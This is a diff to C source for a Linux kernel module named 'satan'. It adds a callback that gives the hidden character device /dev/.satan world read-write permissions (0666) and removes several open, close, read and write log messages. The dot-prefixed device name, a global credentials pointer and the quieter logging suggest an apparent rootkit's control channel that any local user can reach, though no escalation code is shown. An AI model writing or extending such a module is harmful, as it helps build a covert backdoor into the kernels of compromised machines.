@@ -26,13 +26,15 @@ static struct satan_cdev {
 
 static struct cred *cred = NULL;
 
-
 static int satan_cdev_open(struct inode *inode, struct file *filp);
 static int satan_cdev_close(struct inode *inode, struct file *filp);
 static ssize_t satan_cdev_read(struct file *filp, char __user *buf,
                                size_t count, loff_t *offset);
 static ssize_t satan_cdev_write(struct file *filp, const char __user *buf,
                                 size_t count, loff_t *cur_offset);
+
+static char *satan_devnode(struct device *dev, umode_t *mode);
+
 
 
 int satan_cdev_init(struct module *m)
@@ -52,6 +54,7 @@ int satan_cdev_init(struct module *m)
                 pr_alert("satan: cdev: failed to allocate a major number for device file\n");
                 goto out;
         }
+
 
         // Initialize character device
         satan_cdev.cdev = cdev_alloc();
@@ -75,6 +78,9 @@ int satan_cdev_init(struct module *m)
                 goto out;
         }
 
+        satan_cdev.class->devnode = satan_devnode;
+
+
         // Create /dev/.satan for this char dev
         if (IS_ERR(dev = device_create(satan_cdev.class, NULL, satan_cdev.num, NULL, DEVICE_NAME))) {
                 pr_alert("satan: cdev: failed to create /dev/%s\n", DEVICE_NAME);
@@ -82,15 +88,17 @@ int satan_cdev_init(struct module *m)
                 goto out;
         }
 
+
         // initialize our semaphore with an initial value of 1
         sema_init(&satan_cdev.semaphore, 1);
+
 
         // Clear our buffer
         memset(satan_cdev.buf, 0, sizeof(satan_cdev.buf));
 
 out:
         if (ret == 0) {
-                pr_info("satan: successfully initialized device file\n");
+                pr_info("satan: cdev: successfully initialized device file\n");
         }
 
         return ret;
@@ -103,32 +111,29 @@ void satan_cdev_exit(void)
         cdev_del(satan_cdev.cdev);
         unregister_chrdev_region(satan_cdev.num, 1);
 
-        pr_info("satan: successfully destroyed device file\n");
+        pr_info("satan: cdev: successfully destroyed device file\n");
 }
 
 
 static int satan_cdev_open(struct inode *inode, struct file *filp)
 {
         if (0 != down_interruptible(&satan_cdev.semaphore)) {
-                pr_alert("satan: failed to lock device file during open()\n");
+                pr_alert("satan: cdev: failed to lock device file during open()\n");
                 return -1;
         }
 
-        pr_info("satan: successfully opened device file\n");
         return 0;
 }
 
 static int satan_cdev_close(struct inode *inode, struct file *filp)
 {
         up(&satan_cdev.semaphore);
-        pr_info("satan: successfully closed device file\n");
         return 0;
 }
 
 static ssize_t satan_cdev_read(struct file *filp, char __user *buf, size_t len, loff_t *offset)
 {
         int ret = 0;
-        pr_info("satan: reading from device file\n");
 
         if (sizeof(satan_cdev.buf) <= *offset) {
                 ret = 0;
@@ -147,7 +152,6 @@ static ssize_t satan_cdev_read(struct file *filp, char __user *buf, size_t len, 
 static ssize_t satan_cdev_write(struct file *filp, const char __user *buf, size_t len, loff_t *offset)
 {
         int ret = 0;
-        pr_info("satan: writing to device file\n");
 
         if (sizeof(satan_cdev.buf) <= *offset) {
                 ret = 0;
@@ -174,4 +178,14 @@ static ssize_t satan_cdev_write(struct file *filp, const char __user *buf, size_
         }
 
         return ret;
+}
+
+
+static char *satan_devnode(struct device *dev, umode_t *mode)
+{
+        // Set the device file's permission to 0666.
+        if (mode)
+                *mode = 0666;
+
+        return NULL;
 }
